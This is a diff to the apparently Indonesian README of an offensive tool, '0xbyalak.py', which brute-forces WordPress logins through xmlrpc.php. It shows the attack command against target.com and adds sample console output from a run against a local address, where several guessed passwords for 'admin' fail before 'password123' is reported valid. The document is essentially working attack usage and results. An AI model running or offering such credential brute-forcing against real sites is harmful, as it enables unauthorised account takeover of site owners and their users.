@@ -76,3 +76,16 @@ python 0xbyalak.py -u https://target.com/xmlrpc.php -U admin -w passwords.txt -a
 ```
 
 6. Tool akan menampilkan hasil validasi setiap password dan berhenti jika menemukan password yang benar.
+```powershell
+PS C:\Users\iyhor\Desktop> python 0xbyalak.py -u http://192.168.1.12/xmlrpc.php -U admin -w password.txt
+[*] Starting brute force against admin on http://192.168.1.12/xmlrpc.php
+[-] Invalid: admin : 12345
+[-] Invalid: admin : 2004
+[-] Invalid: admin : 1234567890
+[-] Invalid: admin : qwerty
+[-] Invalid: admin : password
+[-] Invalid: admin : qwerty123
+[-] Invalid: admin : banyuwangi
+[+] VALID: admin : password123
+PS C:\Users\iyhor\Desktop>
+```
